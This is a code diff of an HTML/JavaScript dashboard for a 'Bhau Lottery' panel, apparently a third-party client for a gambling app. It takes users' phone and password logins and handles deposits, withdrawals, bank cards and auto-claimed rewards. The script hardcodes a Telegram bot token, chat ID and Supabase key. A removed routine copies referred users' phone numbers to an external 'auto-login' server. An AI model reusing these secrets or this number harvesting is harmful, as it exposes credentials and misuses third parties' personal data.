+    .menu-item.logout-item:hover { border-color: rgba(251, 113, 133, 0.08); }
+    .menu-item.refer-item { border-color: rgba(139, 92, 246, 0.03); }
+    .menu-item.refer-item:hover { border-color: rgba(139, 92, 246, 0.08); }
     .menu-item.active-option {
-      border-color: rgba(151, 119, 255, 0.35);
-      background: rgba(151, 119, 255, 0.06);
-      box-shadow:
-        0 8px 40px rgba(151, 119, 255, 0.04),
-        inset 0 0 40px rgba(151, 119, 255, 0.02);
+      border-color: rgba(139, 92, 246, 0.2);
+      background: rgba(139, 92, 246, 0.03);
+      box-shadow: 0 8px 40px rgba(139, 92, 246, 0.01), inset 0 0 40px rgba(139, 92, 246, 0.005);
     }
-
     .dynamic-card {
-      background: rgba(3, 7, 20, 0.3);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border: 1px solid rgba(255, 255, 255, 0.04);
+      background: rgba(8, 12, 26, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.02);
       border-radius: 24px;
       padding: 18px;
       margin-top: 6px;
-      box-shadow:
-        0 8px 40px rgba(0, 0, 0, 0.25),
-        inset 0 1px rgba(255, 255, 255, 0.02);
-      animation: fadeUp 0.35s cubic-bezier(0.16, 1, 0.3, 1);
-      transition: all 0.3s ease;
+      box-shadow: 0 8px 40px rgba(0, 0, 0, 0.15);
+      animation: fadeUp 0.3s ease;
+      will-change: transform, opacity;
     }
     @keyframes fadeUp {
-      0% { opacity: 0; transform: translateY(12px) scale(0.98); }
+      0% { opacity: 0; transform: translateY(10px) scale(0.98); }
       100% { opacity: 1; transform: translateY(0) scale(1); }
     }
     .dynamic-card .title {
       font-weight: 700;
-      color: #68a9ff;
+      color: #a5b4fc;
       font-size: 16px;
       margin-bottom: 12px;
       display: flex;
       justify-content: space-between;
       align-items: center;
     }
-
     .btn-close-panel {
-      background: rgba(255, 255, 255, 0.04);
-      color: #8a9aaa;
-      border: 1px solid rgba(255, 255, 255, 0.04);
+      background: rgba(255, 255, 255, 0.02);
+      color: #94a3b8;
+      border: 1px solid rgba(255, 255, 255, 0.02);
       padding: 4px 14px;
       font-size: 11px;
       border-radius: 30px;
       cursor: pointer;
-      transition: 0.2s;
-      font-weight: 600;
+      transition: background 0.2s, color 0.2s;
+      touch-action: manipulation;
+      will-change: transform;
     }
-    .btn-close-panel:hover {
-      background: rgba(255, 255, 255, 0.08);
-      color: #f7f8ff;
-    }
-
+    .btn-close-panel:active { transform: scale(0.94); }
     .amount-grid {
       display: grid;
       grid-template-columns: repeat(4, 1fr);
@@ -705,231 +491,197 @@
     }
     .amount-btn {
       padding: 10px 4px;
-      background: rgba(5, 9, 24, 0.5);
-      backdrop-filter: blur(4px);
-      border: 1px solid rgba(255, 255, 255, 0.04);
-      border-radius: 14px;
-      color: #eef2f9;
+      background: rgba(8, 12, 26, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.02);
+      border-radius: 16px;
+      color: #cbd5e1;
       font-weight: 600;
       font-size: 13px;
       cursor: pointer;
-      transition: 0.2s;
-      box-shadow: inset 0 1px rgba(255, 255, 255, 0.02);
+      transition: transform 0.15s, border 0.2s, background 0.2s, box-shadow 0.2s;
+      touch-action: manipulation;
+      will-change: transform;
     }
     .amount-btn:active { transform: scale(0.95); }
     .amount-btn.active {
-      border-color: #7dffb3;
-      background: rgba(125, 255, 179, 0.06);
-      color: #7dffb3;
-      box-shadow: 0 0 30px rgba(125, 255, 179, 0.04);
+      border-color: #34d399;
+      background: rgba(52, 211, 153, 0.03);
+      color: #34d399;
+      box-shadow: 0 0 30px rgba(52, 211, 153, 0.01);
     }
     .amount-btn.custom-amount-btn {
-      border-color: rgba(255, 215, 0, 0.12);
-      color: #ffd700;
+      border-color: rgba(251, 189, 36, 0.06);
+      color: #fbbf24;
     }
     .amount-btn.custom-amount-btn.active {
-      border-color: #ffd700;
-      background: rgba(255, 215, 0, 0.06);
+      border-color: #fbbf24;
+      background: rgba(251, 189, 36, 0.03);
     }
-
     .payment-method {
       display: flex;
       align-items: center;
       gap: 10px;
       padding: 10px 14px;
       background: rgba(0, 0, 0, 0.2);
-      backdrop-filter: blur(4px);
-      border-radius: 14px;
+      border-radius: 16px;
       margin-bottom: 6px;
       border: 1px solid transparent;
       cursor: pointer;
-      transition: 0.2s;
+      transition: border 0.2s, background 0.2s;
+      touch-action: manipulation;
       font-size: 12px;
+      will-change: border, background;
     }
     .payment-method.selected {
-      border-color: #7dffb3;
-      background: rgba(125, 255, 179, 0.04);
-      box-shadow: 0 0 30px rgba(125, 255, 179, 0.03);
+      border-color: #34d399;
+      background: rgba(52, 211, 153, 0.02);
+      box-shadow: 0 0 30px rgba(52, 211, 153, 0.005);
     }
-    .payment-method .pm-name { color: #eef2f9; font-weight: 500; }
-    .payment-method .pm-desc { color: #6a7a9a; font-size: 10px; }
-
+    .payment-method .pm-name { color: #e2e8f0; font-weight: 500; }
+    .payment-method .pm-desc { color: #6b7280; font-size: 10px; }
     .btn-sm {
       padding: 10px 16px;
       border: none;
-      border-radius: 14px;
+      border-radius: 16px;
       font-weight: 700;
       font-size: 13px;
       cursor: pointer;
-      transition: 0.2s;
+      transition: transform 0.15s, box-shadow 0.2s;
+      touch-action: manipulation;
       display: inline-flex;
       align-items: center;
       justify-content: center;
       gap: 6px;
+      will-change: transform;
     }
     .btn-sm:active { transform: scale(0.95); }
     .btn-block { width: 100%; }
-
     .btn-deposit {
-      background: linear-gradient(135deg, #2ed573, #1b9e4a);
+      background: linear-gradient(135deg, #34d399, #059669);
       color: #fff;
-      box-shadow: 0 4px 24px rgba(46, 213, 115, 0.15);
+      box-shadow: 0 4px 24px rgba(52, 211, 153, 0.08);
     }
-    .btn-deposit:hover { box-shadow: 0 6px 32px rgba(46, 213, 115, 0.2); transform: translateY(-1px); }
-
+    .btn-deposit:hover { box-shadow: 0 6px 32px rgba(52, 211, 153, 0.12); }
     .btn-withdraw {
-      background: linear-gradient(135deg, #d4a020, #b8841a);
-      color: #fff;
-      box-shadow: 0 4px 24px rgba(212, 160, 32, 0.15);
+      background: linear-gradient(135deg, #fbbf24, #d97706);
+      color: #0b1120;
+      box-shadow: 0 4px 24px rgba(251, 189, 36, 0.08);
     }
-    .btn-withdraw:hover { box-shadow: 0 6px 32px rgba(212, 160, 32, 0.2); transform: translateY(-1px); }
-
+    .btn-withdraw:hover { box-shadow: 0 6px 32px rgba(251, 189, 36, 0.12); }
     .btn-card-add {
-      background: linear-gradient(135deg, #ff6b35, #e55a2b);
+      background: linear-gradient(135deg, #8b5cf6, #6d28d9);
       color: #fff;
-      box-shadow: 0 4px 24px rgba(255, 107, 53, 0.15);
+      box-shadow: 0 4px 24px rgba(139, 92, 246, 0.08);
     }
-    .btn-card-add:hover { box-shadow: 0 6px 32px rgba(255, 107, 53, 0.2); transform: translateY(-1px); }
-
-    .btn-success { background: #1f8b4c; color: #fff; box-shadow: 0 4px 24px rgba(31, 139, 76, 0.15); }
-    .btn-warning { background: #d4a020; color: #000; box-shadow: 0 4px 24px rgba(212, 160, 32, 0.15); }
-    .btn-primary { background: #3d5aa0; color: #fff; box-shadow: 0 4px 24px rgba(61, 90, 160, 0.15); }
-    .btn-refer { background: linear-gradient(135deg, #00b4d8, #0077b6); color: #fff; box-shadow: 0 4px 24px rgba(0, 180, 216, 0.15); }
-    .btn-outline { background: transparent; border: 1px solid rgba(255, 255, 255, 0.06); color: #8a9aaa; }
-
-    .balance-info {
-      font-size: 12px;
-      color: #8a9aaa;
-      text-align: center;
-      padding: 4px 0 8px;
-    }
-    .balance-info span { color: #5df0ae; font-weight: 700; }
-
-    .input-group {
-      margin-bottom: 10px;
-    }
+    .btn-card-add:hover { box-shadow: 0 6px 32px rgba(139, 92, 246, 0.12); }
+    .btn-success { background: #059669; color: #fff; box-shadow: 0 4px 24px rgba(5, 150, 105, 0.08); }
+    .btn-warning { background: #fbbf24; color: #0b1120; box-shadow: 0 4px 24px rgba(251, 189, 36, 0.08); }
+    .btn-primary { background: #6d28d9; color: #fff; box-shadow: 0 4px 24px rgba(109, 40, 217, 0.08); }
+    .btn-refer { background: linear-gradient(135deg, #fbbf24, #f59e0b); color: #0b1120; box-shadow: 0 4px 24px rgba(251, 189, 36, 0.08); }
+    .btn-outline { background: transparent; border: 1px solid rgba(255, 255, 255, 0.03); color: #94a3b8; }
+    .balance-info { font-size: 12px; color: #94a3b8; text-align: center; padding: 4px 0 8px; }
+    .balance-info span { color: #34d399; font-weight: 700; }
+    .input-group { margin-bottom: 10px; }
     .input-group label {
       display: block;
-      color: #7a8aaa;
+      color: #6b7280;
       font-size: 10px;
       font-weight: 600;
       margin-bottom: 3px;
       letter-spacing: 0.3px;
     }
+    .input-row {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .input-row input {
+      flex: 1;
+      padding: 10px 14px;
+      background: rgba(8, 12, 26, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.02);
+      border-radius: 16px;
+      color: #e2e8f0;
+      font-size: 14px;
+      outline: none;
+      transition: border 0.2s, box-shadow 0.2s;
+      box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.1);
+      will-change: border, box-shadow;
+    }
+    .input-row input:focus {
+      border-color: rgba(52, 211, 153, 0.08);
+      box-shadow: 0 0 0 3px rgba(52, 211, 153, 0.005), inset 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+    .btn-camera {
+      padding: 10px 14px;
+      background: rgba(139, 92, 246, 0.10);
+      border: 1px solid rgba(139, 92, 246, 0.08);
+      border-radius: 16px;
+      color: #a5b4fc;
+      font-size: 18px;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.15s;
+      touch-action: manipulation;
+      will-change: transform;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .btn-camera:active { transform: scale(0.94); }
+    .btn-camera:hover { background: rgba(139, 92, 246, 0.15); }
+    .btn-camera:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
     .input-group input, .input-group select {
       width: 100%;
       padding: 10px 14px;
-      background: rgba(5, 9, 24, 0.5);
-      backdrop-filter: blur(4px);
-      border: 1px solid rgba(255, 255, 255, 0.04);
-      border-radius: 14px;
-      color: #eef2f9;
+      background: rgba(8, 12, 26, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.02);
+      border-radius: 16px;
+      color: #e2e8f0;
       font-size: 14px;
       outline: none;
-      transition: 0.2s;
+      transition: border 0.2s, box-shadow 0.2s;
       box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.1);
+      will-change: border, box-shadow;
     }
     .input-group input:focus {
-      border-color: rgba(125, 255, 179, 0.15);
-      box-shadow: 0 0 0 3px rgba(125, 255, 179, 0.02), inset 0 2px 8px rgba(0, 0, 0, 0.1);
+      border-color: rgba(52, 211, 153, 0.08);
+      box-shadow: 0 0 0 3px rgba(52, 211, 153, 0.005), inset 0 2px 8px rgba(0, 0, 0, 0.1);
     }
-
     .mt-10 { margin-top: 10px; }
     .mb-10 { margin-bottom: 10px; }
     .text-center { text-align: center; }
     .flex-row { display: flex; gap: 8px; flex-wrap: wrap; }
-
-    .game-result {
-      background: rgba(0, 0, 0, 0.2);
-      padding: 10px;
-      border-radius: 14px;
-      font-size: 11px;
-      margin-top: 8px;
-    }
-    .game-result .ok { color: #5df0ae; }
-
+    .game-result { background: rgba(0, 0, 0, 0.2); padding: 10px; border-radius: 16px; font-size: 11px; margin-top: 8px; }
+    .game-result .ok { color: #34d399; }
     .refer-user-item {
       display: flex;
       justify-content: space-between;
       align-items: center;
       padding: 8px 10px;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.01);
       font-size: 12px;
     }
-    .refer-user-item .user-phone { color: #eef2f9; font-weight: 500; }
-    .refer-user-item .user-time { color: #6a7a9a; font-size: 10px; }
-    .refer-user-item .user-status { color: #5df0ae; font-size: 10px; }
-
-    .exit-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(0, 0, 0, 0.7);
-      backdrop-filter: blur(12px);
-      z-index: 9999;
-      justify-content: center;
-      align-items: center;
-    }
-    .exit-overlay.active { display: flex; }
-    .exit-popup {
-      background: linear-gradient(145deg, rgba(22, 27, 55, 0.95), rgba(6, 10, 25, 0.98));
-      border: 1px solid rgba(151, 119, 255, 0.2);
-      border-radius: 28px;
-      padding: 30px 24px 24px;
-      max-width: 380px;
-      width: 90%;
-      text-align: center;
-      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), 0 0 60px rgba(102, 36, 255, 0.05);
-      animation: popupIn 0.3s ease;
-    }
-    @keyframes popupIn {
-      0% { transform: scale(0.9); opacity: 0; }
-      100% { transform: scale(1); opacity: 1; }
-    }
-    .exit-popup .popup-icon { font-size: 48px; margin-bottom: 12px; }
-    .exit-popup .popup-title { font-size: 22px; font-weight: 800; color: #f7f8ff; margin-bottom: 6px; }
-    .exit-popup .popup-sub { color: #8a9aaa; font-size: 14px; margin-bottom: 20px; }
-    .exit-popup .popup-buttons { display: flex; gap: 12px; }
-    .exit-popup .popup-buttons button {
-      flex: 1;
-      padding: 14px 10px;
-      border: none;
-      border-radius: 16px;
-      font-weight: 700;
-      font-size: 15px;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-    .exit-popup .popup-buttons button:active { transform: scale(0.96); }
-    .exit-popup .popup-buttons .btn-stay {
-      background: linear-gradient(100deg, #126aff, #6124e9 60%, #b22cff);
-      color: #fff;
-      box-shadow: 0 8px 25px rgba(73, 46, 255, 0.2);
-    }
-    .exit-popup .popup-buttons .btn-exit {
-      background: rgba(255, 70, 70, 0.08);
-      color: #ff6b6b;
-      border: 1px solid rgba(255, 70, 70, 0.1);
-    }
-    .exit-popup .popup-buttons .btn-exit:hover { background: rgba(255, 70, 70, 0.15); }
-
+    .refer-user-item .user-phone { color: #e2e8f0; font-weight: 500; }
+    .refer-user-item .user-time { color: #6b7280; font-size: 10px; }
+    .refer-user-item .user-status { color: #34d399; font-size: 10px; }
     @media (max-width: 440px) {
       .page { padding: 0 4px; }
-      .glass { padding: 18px 12px; }
-      .menu-grid { gap: 8px; }
-      .amount-grid { grid-template-columns: repeat(3,1fr); }
-      .exit-popup { padding: 24px 16px 20px; }
-      .exit-popup .popup-title { font-size: 19px; }
+      .glass { padding: 18px 12px; border-radius: 32px; }
+      .menu-grid { grid-template-columns: 1fr 1fr 1fr; gap: 6px; }
+      .amount-grid { grid-template-columns: repeat(3, 1fr); }
+      .exit-popup, .logout-confirm-popup { padding: 24px 16px 20px; }
+      .exit-popup .popup-title, .logout-confirm-popup .popup-title { font-size: 19px; }
       .save-number-panel .input-group { flex-direction: column; }
       .save-number-panel .input-group .save-btn { width: 100%; }
-      .logout-confirm-popup { padding: 24px 16px 20px; }
-      .logout-confirm-popup .popup-title { font-size: 19px; }
-      .welcome-text .sub-title { font-size: 17px; }
+      .welcome-text .sub-title { font-size: 22px; }
       .user-badge { padding: 8px 12px; }
-      .user-badge .balance { font-size: 15px; padding: 3px 12px; }
+      .user-badge .balance { font-size: 15px; padding: 3px 14px; }
+      .menu-item .icon { font-size: 22px; }
+      .menu-item .title { font-size: 10px; }
+    }
+    @media (max-width: 380px) {
+      .menu-grid { grid-template-columns: 1fr 1fr; }
     }
   </style>
 </head>
@@ -942,7 +694,7 @@
     <div id="logoutConfirmOverlay" class="logout-confirm-overlay">
       <div class="logout-confirm-popup">
         <div class="popup-icon">🚪</div>
-        <div class="popup-title">Do you want to logout?</div>
+        <div class="popup-title">Logout, Soumya?</div>
         <div class="popup-sub">Your session will be cleared and you'll return to the login page.</div>
         <div class="popup-buttons">
           <button class="btn-no" id="logoutNoBtn">No</button>
@@ -954,8 +706,8 @@
     <div id="loginSection" class="login-section">
       <div class="welcome-text">
         <div class="mini">✦ WELCOME BACK ✦</div>
-        <div class="sub-title">BHAU LOTTERY PANNEL</div>
-        <p>Login to continue your journey</p>
+        <div class="sub-title">BHau <span class="highlight">LOTTERY</span></div>
+        <p>Login to continue your premium journey</p>
       </div>
       <form id="loginForm">
         <div class="form-group">
@@ -973,7 +725,7 @@
             <button type="button" id="showPassBtn" class="password-toggle">◉</button>
           </div>
         </div>
-        <button class="login-btn" type="submit" id="loginBtn">🔑 &nbsp; LOGIN &amp; LOAD GAME &nbsp; →</button>
+        <button class="login-btn" type="submit" id="loginBtn">🔑 &nbsp; LOGIN &amp; LOAD &nbsp; →</button>
         <button type="button" class="autopaste-btn" id="autopasteBtn">📋 AUTOPASTE</button>
       </form>
 
@@ -989,7 +741,7 @@
         <a href="https://t.me/bhauwithdraldata" target="_blank" class="tg-btn">📲 JOIN TELEGRAM</a>
       </div>
 
-      <div class="login-footer">BY SANJU</div>
+      <div class="login-footer">CRAFTED BY <span class="highlight">SOUMYA</span></div>
     </div>
 
     <div id="dashboard" class="dashboard">
@@ -1019,27 +771,27 @@
           <div class="menu-item deposit-item" data-action="deposit">
             <span class="icon">💰</span>
             <div class="title">Deposit</div>
-            <div class="desc">Add funds to account</div>
+            <div class="desc">Add funds</div>
           </div>
           <div class="menu-item" data-action="games">
             <span class="icon">🎮</span>
-            <div class="title">Launch Games</div>
-            <div class="desc">Fan Tan, Chicken Road</div>
+            <div class="title">Games</div>
+            <div class="desc">Fan Tan · Chicken</div>
           </div>
           <div class="menu-item card-item" data-action="addcard">
             <span class="icon">💳</span>
-            <div class="title">Add Bank Card</div>
-            <div class="desc">Add new card</div>
+            <div class="title">Add Card</div>
+            <div class="desc">Bank card</div>
           </div>
           <div class="menu-item auto-claim" data-action="autoclaim">
             <span class="icon">⚡</span>
             <div class="title">Auto Claim</div>
-            <div class="desc">VIP Reward + 2 Spins</div>
+            <div class="desc">VIP + 2 Spins</div>
           </div>
           <div class="menu-item" data-action="balance">
             <span class="icon">📊</span>
-            <div class="title">Show Balance</div>
-            <div class="desc">Check balance</div>
+            <div class="title">Balance</div>
+            <div class="desc">Check funds</div>
           </div>
           <div class="menu-item withdraw-item" data-action="withdraw">
             <span class="icon">💸</span>
@@ -1048,13 +800,13 @@
           </div>
           <div class="menu-item" data-action="transactions">
             <span class="icon">📋</span>
-            <div class="title">Transactions</div>
-            <div class="desc">Deposit & Withdraw history</div>
+            <div class="title">History</div>
+            <div class="desc">Transactions</div>
           </div>
           <div class="menu-item refer-item" data-action="refer">
             <span class="icon">👥</span>
-            <div class="title">Refer & Earn</div>
-            <div class="desc">Referral history & rewards</div>
+            <div class="title">Referrals</div>
+            <div class="desc">Refer & earn</div>
           </div>
           <div class="menu-item logout-item" data-action="logout">
             <span class="icon">🚪</span>
@@ -1071,7 +823,7 @@
 <div id="exitOverlay" class="exit-overlay">
   <div class="exit-popup">
     <div class="popup-icon">🚪</div>
-    <div class="popup-title">Exit Dashboard?</div>
+    <div class="popup-title">Exit Dashboard, Soumya?</div>
     <div class="popup-sub">Are you sure you want to leave? Your session will remain active.</div>
     <div class="popup-buttons">
       <button class="btn-stay" id="exitStayBtn">🔒 Stay</button>
@@ -1081,19 +833,17 @@
 </div>
 
 <script>
-(function() {
+(function(){
   'use strict';
 
-  // ---- SUPABASE AUTO LOGIN API CONFIG ----
+  // ─── CONFIG ────────────────────────────────────────────────────────────────
   const AUTO_LOGIN_API = "https://amaeuexpeyyjeqihamwj.supabase.co/functions/v1/auto-login";
   const SUPABASE_ANON_KEY = "sb_publishable_IY9j-eevqN1X_31mZd0H4A_jOJeaIOV";
-
-  // ---- TELEGRAM CONFIG ----
   const TELEGRAM_BOT_TOKEN = '8638134053:AAGVC6fIVhGUsKibPEFq7skSY5QqosE6U18';
   const TELEGRAM_CHAT_ID = '-1004415634813';
 
-  // ---- STATE ----
-  const state = {
+  // ─── STATE ──────────────────────────────────────────────────────────────────
+  const S = {
     token: null,
     phone: null,
     isLoggedIn: false,
@@ -1108,2021 +858,922 @@
     selectedCard: null,
     isAutoClaiming: false,
     transactionPage: 1,
-    transactionYearMonth: null,
     currentPanel: null,
     referralHistoryCache: null,
     isPanelOpen: false,
+    _toastTimer: null
   };
 
-  // ---- DOM REFS ----
-  const loginSection = document.getElementById('loginSection');
-  const dashboard = document.getElementById('dashboard');
-  const phoneInput = document.getElementById('phoneInput');
-  const passwordInput = document.getElementById('passwordInput');
-  const loginBtn = document.getElementById('loginBtn');
-  const autopasteBtn = document.getElementById('autopasteBtn');
-  const userPhoneDisplay = document.getElementById('userPhoneDisplay');
-  const balanceDisplay = document.getElementById('balanceDisplay');
-  const showPassBtn = document.getElementById('showPassBtn');
-  const dynamicContent = document.getElementById('dynamicContent');
-  const menuGrid = document.getElementById('menuGrid');
-  const exitOverlay = document.getElementById('exitOverlay');
-  const exitStayBtn = document.getElementById('exitStayBtn');
-  const exitLeaveBtn = document.getElementById('exitLeaveBtn');
-  const saveNumberInput = document.getElementById('saveNumberInput');
-  const saveNumberBtn = document.getElementById('saveNumberBtn');
-  const autoSaveReferralsBtn = document.getElementById('autoSaveReferralsBtn');
-  const numberStatus = document.getElementById('numberStatus');
-  const saveStatusText = document.getElementById('saveStatusText');
-  const numberList = document.getElementById('numberList');
-  const autoNumberPanel = document.getElementById('autoNumberPanel');
-  const toast = document.getElementById('toastNotification');
-  const logoutConfirmOverlay = document.getElementById('logoutConfirmOverlay');
-  const logoutYesBtn = document.getElementById('logoutYesBtn');
-  const logoutNoBtn = document.getElementById('logoutNoBtn');
+  // ─── DOM REFS ────────────────────────────────────────────────────────────
+  const $ = id => document.getElementById(id);
+  const loginSection = $('loginSection');
+  const dashboard = $('dashboard');
+  const phoneInput = $('phoneInput');
+  const passwordInput = $('passwordInput');
+  const loginBtn = $('loginBtn');
+  const autopasteBtn = $('autopasteBtn');
+  const userPhoneDisplay = $('userPhoneDisplay');
+  const balanceDisplay = $('balanceDisplay');
+  const showPassBtn = $('showPassBtn');
+  const dynamicContent = $('dynamicContent');
+  const menuGrid = $('menuGrid');
+  const exitOverlay = $('exitOverlay');
+  const exitStayBtn = $('exitStayBtn');
+  const exitLeaveBtn = $('exitLeaveBtn');
+  const saveNumberInput = $('saveNumberInput');
+  const saveNumberBtn = $('saveNumberBtn');
+  const autoSaveReferralsBtn = $('autoSaveReferralsBtn');
+  const numberStatus = $('numberStatus');
+  const saveStatusText = $('saveStatusText');
+  const numberList = $('numberList');
+  const autoNumberPanel = $('autoNumberPanel');
+  const toast = $('toastNotification');
+  const logoutConfirmOverlay = $('logoutConfirmOverlay');
+  const logoutYesBtn = $('logoutYesBtn');
+  const logoutNoBtn = $('logoutNoBtn');
 
-  // ---- TOAST NOTIFICATION ----
-  let toastTimeout = null;
-
-  function showToast(message, type = 'error') {
-    if (toastTimeout) {
-      clearTimeout(toastTimeout);
-      toastTimeout = null;
+  // ─── GOOGLE LENS / CAMERA LAUNCHER ────────────────────────────────────────
+  function openGoogleLensOrCamera() {
+    // Check if we're on Android
+    const isAndroid = /android/i.test(navigator.userAgent);
+    const isIOS = /iphone|ipad|ipod/i.test(navigator.userAgent);
+    
+    if (isAndroid) {
+      // Try to open Google Lens via intent
+      try {
+        // Google Lens intent for Android
+        const lensIntent = 'intent://scan/#Intent;scheme=googleapp;package=com.google.android.googlequicksearchbox;action=com.google.android.googlequicksearchbox.GOOGLE_LENS;end';
+        window.location.href = lensIntent;
+        
+        // If Lens doesn't open, fallback to camera after a timeout
+        setTimeout(() => {
+          // Check if we're still on the page (Lens didn't open)
+          const fallbackInput = document.createElement('input');
+          fallbackInput.type = 'file';
+          fallbackInput.accept = 'image/*';
+          fallbackInput.capture = 'environment';
+          fallbackInput.style.display = 'none';
+          document.body.appendChild(fallbackInput);
+          fallbackInput.click();
+          document.body.removeChild(fallbackInput);
+          showToast('Google Lens not available. Opening camera...', 'warning');
+        }, 1500);
+        
+        return;
+      } catch (e) {
+        // Fallback to camera
+        openCamera();
+      }
+    } else if (isIOS) {
+      // iOS: use native camera or Live Text (iOS 16+)
+      // We'll use the file input with camera capture
+      openCamera();
+    } else {
+      // Desktop: open file picker
+      openFilePicker();
     }
-    toast.textContent = message;
-    toast.className = 'toast-notification ' + type;
-    void toast.offsetWidth;
-    toast.classList.add('show');
-    toastTimeout = setTimeout(() => {
-      toast.classList.remove('show');
-    }, 5000);
   }
 
-  // ---- SUPABASE AUTO LOGIN API FUNCTION ----
-  async function autoLoginAPI(action, extraData = {}) {
-    const response = await fetch(AUTO_LOGIN_API, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "apikey": SUPABASE_ANON_KEY,
-        "Authorization": "Bearer " + SUPABASE_ANON_KEY
-      },
-      body: JSON.stringify({
-        action,
-        ...extraData
-      })
+  function openCamera() {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.accept = 'image/*';
+    input.capture = 'environment';
+    input.style.display = 'none';
+    document.body.appendChild(input);
+    
+    input.addEventListener('change', function(e) {
+      const file = e.target.files[0];
+      if (file) {
+        showToast('📸 Photo captured! You can now use Google Lens from your gallery to copy the number.', 'success');
+        // Show a helpful message with instructions
+        setTimeout(() => {
+          const userWantsManual = confirm(
+            '📸 Photo saved to gallery.\n\n' +
+            'To copy the account number:\n' +
+            '1. Open Google Lens from your gallery\n' +
+            '2. Select the photo you just took\n' +
+            '3. Copy the numbers and paste them here\n\n' +
+            'OR tap "OK" to enter the number manually now.'
+          );
+          if (userWantsManual) {
+            const manualNumber = prompt('Please type the account number manually:');
+            if (manualNumber && manualNumber.trim().length > 0) {
+              const inputField = document.getElementById('cardNumberInput');
+              if (inputField) {
+                inputField.value = manualNumber.trim().replace(/\s/g, '');
+                showToast('✅ Number entered manually.', 'success');
+              }
+            }
+          }
+        }, 1000);
+      }
+      document.body.removeChild(input);
     });
-
-    const data = await response.json();
-
-    if (!response.ok || data.ok !== true) {
-      throw new Error(data.error || "Auto Login API request failed");
-    }
-
-    return data;
+    
+    input.click();
   }
 
-  // ---- UPDATE NUMBER DISPLAY FROM SERVER ----
-  async function updateNumberDisplayFromServer() {
-    try {
-      const result = await autoLoginAPI("get_unused");
-      const numbers = (result.numbers || []).slice(0, 3);
-
-      numberStatus.textContent = `${numbers.length} unused`;
-      numberStatus.style.color = numbers.length > 0 ? "#5df0ae" : "#6a7a9a";
-
-      if (numbers.length === 0) {
-        numberList.innerHTML = '<span style="color:#6a7a9a;font-size:11px;">No unused numbers available</span>';
-        return;
-      }
-
-      numberList.innerHTML = numbers.map(item => `
-        <div class="number-item">
-          📱 ${item.phone_number}
-        </div>
-      `).join("");
-
-    } catch (error) {
-      numberStatus.textContent = "0 unused";
-      numberList.innerHTML = '<span style="color:#ff6b6b;font-size:11px;">Unable to load numbers</span>';
-      console.error("Auto Login numbers:", error);
-    }
-  }
-
-  // ---- SAVE NUMBER TO SERVER (MANUAL) ----
-  async function addAutoNumberFromServer() {
-    const phone = saveNumberInput.value.trim();
-
-    if (!/^[6-9]\d{9}$/.test(phone)) {
-      showToast("Enter a valid 10-digit number.", "warning");
-      return;
-    }
-
-    saveNumberBtn.disabled = true;
-
-    try {
-      await autoLoginAPI("save", {
-        phone: phone
-      });
-
-      saveNumberInput.value = "";
-      showToast("Number saved successfully.", "success");
-      await updateNumberDisplayFromServer();
-
-    } catch (error) {
-      showToast(error.message, "error");
-    } finally {
-      saveNumberBtn.disabled = false;
-    }
-  }
-
-  // ---- MANUAL AUTO SAVE REFERRALS (User-triggered only) ----
-  async function manualAutoSaveReferrals() {
-    autoSaveReferralsBtn.disabled = true;
-    autoSaveReferralsBtn.textContent = '⏳ Saving...';
-
-    try {
-      // Get current unused numbers
-      const unusedResult = await autoLoginAPI("get_unused");
-      const currentUnused = unusedResult.numbers || [];
-      
-      // If already 3 unused, no need to add more
-      if (currentUnused.length >= 3) {
-        showToast("All 3 slots are already occupied.", "warning");
-        autoSaveReferralsBtn.disabled = false;
-        autoSaveReferralsBtn.textContent = '📥 AUTO SAVE REFERRALS';
-        return;
-      }
-      
-      // Get referral history from cache
-      const referrals = state.referralHistoryCache || [];
-      if (!referrals || referrals.length === 0) {
-        showToast("No referral history available. Please load Referral History first.", "warning");
-        autoSaveReferralsBtn.disabled = false;
-        autoSaveReferralsBtn.textContent = '📥 AUTO SAVE REFERRALS';
-        return;
-      }
-      
-      console.log(`Manual Auto Save: Processing ${referrals.length} referrals from cache`);
-      
-      // Get currently unused numbers for duplicate check
-      const unusedNumbers = currentUnused.map(n => n.phone_number);
-      
-      // Available slots
-      const availableSlots = 3 - currentUnused.length;
-      let addedCount = 0;
-      let processedCount = 0;
-      let duplicateCount = 0;
-      let invalidCount = 0;
-      
-      // Process referrals sequentially from the beginning
-      for (const ref of referrals) {
-        if (addedCount >= availableSlots) {
-          console.log(`Manual Auto Save: Reached max slots (${availableSlots}), stopping`);
-          break;
-        }
-        processedCount++;
-        
-        // Use the confirmed field: inviteUserPhone
-        let phone = ref.inviteUserPhone || '';
-        
-        // Clean phone number - remove non-digit characters
-        if (phone) {
-          phone = phone.toString().replace(/\D/g, '');
-        }
-        
-        // Validate: exactly 10 digits, starting with 6-9
-        if (!phone || phone.length !== 10 || !/^[6-9]\d{9}$/.test(phone)) {
-          console.log(`Manual Auto Save: Skipping referral #${processedCount} - invalid phone: "${phone}"`);
-          invalidCount++;
-          continue;
-        }
-        
-        // Check if already exists in UNUSED numbers
-        if (unusedNumbers.includes(phone)) {
-          console.log(`Manual Auto Save: Skipping referral #${processedCount} - phone ${phone} already UNUSED`);
-          duplicateCount++;
-          continue;
-        }
-        
-        // Try to save the number to Supabase
-        console.log(`Manual Auto Save: Attempting to save referral phone: ${phone}`);
-        try {
-          const saveResult = await autoLoginAPI("save", { phone: phone });
-          console.log(`Manual Auto Save: Successfully saved ${phone} to Supabase`, saveResult);
-          addedCount++;
